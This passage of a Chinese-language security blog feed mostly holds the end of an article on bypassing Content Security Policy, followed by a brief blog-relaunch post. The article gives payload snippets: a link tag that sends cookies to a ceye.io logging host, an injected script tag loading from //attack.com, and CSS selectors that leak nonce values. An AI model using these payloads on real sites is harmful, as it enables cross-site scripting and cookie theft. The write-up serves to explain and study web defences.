class="string">"//[cookie].xxx.ceye.io"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>link标签除了这两种rel，还有preconnect、prerender、subresource、preload等</p><h3 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h3><p>有些网站限制只有某些脚本才能使用，往往会使用\&lt;script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none';script-src 'nonce-abc'</span><br></pre></td></tr></table></figure><p>那么当脚本插入点为如下的情况时</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以插入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"</span></span></span><br></pre></td></tr></table></figure><p>这里利用浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用DOM-XSS"><a href="#利用DOM-XSS" class="headerlink" title="利用DOM XSS"></a>利用DOM XSS</h3><p>如果JS存在操作location.hash导致的XSS，那么这样的攻击请求不会经过后台，那么nonce后的随机值就不会刷新。可以见下面lorexxar师傅的博文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br></pre></td></tr></table></figure><p>如果有DOM操作可以插入HTML并且可以控制插入的HTML内容，那么也可以绕过CSP</p><h3 id="利用CSS-静态xss-获取nonce值"><a href="#利用CSS-静态xss-获取nonce值" class="headerlink" title="利用CSS 静态xss 获取nonce值"></a>利用CSS 静态xss 获取nonce值</h3><p>利用CSS选择器来逐字节获取信息，^=从头部判断</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="a"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=a"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="b"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=b"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="c"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=c"</span>)&#125;</span><br></pre></td></tr></table></figure><p>比如确定第一位为c，那么就会继续下面的步骤</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="ca"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=ca"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cb"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cb"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cc"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cc"</span>)&#125;</span><br></pre></td></tr></table></figure><p>由于是CSS的变化，没有引起服务器重新请求，所以nonce的值不会改变，偷取值后即可执行我们的script</p><h3 id="利用跨域传输数据"><a href="#利用跨域传输数据" class="headerlink" title="利用跨域传输数据"></a>利用跨域传输数据</h3><p>利用一些跨域传输的方法来引入JS，导致执行</p><p>具体的可以看看呆子不开口的乌云大会PPT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1pLCfCWr</span><br></pre></td></tr></table></figure><p>和0CTF2018预选赛中的h4xors.club2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2018/04/10/0ctf2018-club2/</span><br></pre></td></tr></table></figure><h3 id="利用文件上传执行JS"><a href="#利用文件上传执行JS" class="headerlink" title="利用文件上传执行JS"></a>利用文件上传执行JS</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'self'</span><br></pre></td></tr></table></figure><p>针对只能加载同域下script的CSP策略，如果有上传点可以控制，那么可以在其中夹杂js代码，然后引用该文件完成执行。</p><p>可以参考前几天梅子酒师傅写的上传Wave文件绕过CSP，执行JS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw</span><br></pre></td></tr></table></figure><h3 id="base标签"><a href="#base标签" class="headerlink" title="base标签"></a>base标签</h3><p>利用base标签改变资源加载的域，从而引入恶意的js，造成js执行</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>可以看到CSP的绕过比较看重实际场景，不同的情况下有着不同的绕过方法。</p><p>作者能力有限，如果文章中有什么问题，欢迎交流。最后，恭喜RNG！</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/09/CSP%20Is%20Dead,%20Long%20Live%20CSP!%20On%20the%20Insecurity%20of%20Whitelists%20and%20the%20Future%20of%20Content%20Security%20Policy/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/10/25/csp-paper/#0x02-CSP%EF%BC%88Content-Security-Policy%EF%BC%89</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/f1de775bc43e</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/91/</span><br><span class="line"></span><br><span class="line">http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发在信安之路上 &lt;a href=&quot;https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/z_XmhrTUg_
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CSP" scheme="https://hurricane618.me/tags/CSP/"/>
    
      <category term="XSS" scheme="https://hurricane618.me/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>新的开始</title>
    <link href="https://hurricane618.me/2018/06/26/new-start/"/>
    <id>https://hurricane618.me/2018/06/26/new-start/</id>
    <published>2018-06-26T03:10:58.000Z</published>
    <updated>2018-07-19T01:05:29.276Z</updated>
    
    <content type="html"><![CDATA[<p>之前的博客荒废掉了，所以在github上开一个新的博客希望能够坚持下去吧。也不讲太多矫情的话了，撸起袖子就是肝。</p><p>一开始会更新的比较慢，hexo的博客还需要一段时间适应，之后会逐渐加快。</p><img src="/2018/06/26/new-start/67863722_p0.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前的博客荒废掉了，所以在github上开一个新的博客希望能够坚持下去吧。也不讲太多矫情的话了，撸起袖子就是肝。&lt;/p&gt;
&lt;p&gt;一开始会更新的比较慢，hexo的博客还需要一段时间适应，之后会逐渐加快。&lt;/p&gt;
&lt;img src=&quot;/2018/06/26/new-start/
      
    
    </summary>
    
      <category term="杂谈" scheme="https://hurricane618.me/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="闲聊" scheme="https://hurricane618.me/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
</feed>
